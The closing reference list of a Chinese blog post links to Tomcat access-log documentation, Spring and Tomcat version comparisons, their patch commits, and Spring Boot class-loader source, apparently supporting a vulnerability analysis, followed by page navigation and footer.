<ol><li> <p>Tomcat access_log配置参考文档：https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Logging</p> </li><li> <p>Spring 5.3.17和5.3.18版本比较：https://github.com/spring-projects/spring-framework/compare/v5.3.17...v5.3.18</p> </li><li> <p>Spring 5.3.18补丁提交内容：https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15</p> </li><li> <p>Tomcat 9.0.61和9.0.62版本比较：https://github.com/apache/tomcat/compare/9.0.61...9.0.62</p> </li><li> <p>Tomcat 9.0.62补丁提交内容：https://github.com/apache/tomcat/commit/8a904f6065080409a1e00606cd7bceec6ad8918c</p> </li><li> <p>LaunchedURLClassLoader源码：https://github.com/spring-projects/spring-boot/blob/main/spring-boot-project/spring-boot-tools/spring-boot-loader/src/main/java/org/springframework/boot/loader/LaunchedURLClassLoader.java</p> </li></ol>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/b5fee905029295cfde647c1f58b3d553/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">安装pyqt5遇到的问题（已解决）</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/11bbdea71b79cdc5b51deaf6c9ead136/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Pytorch中.detach()与.data()的用法</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>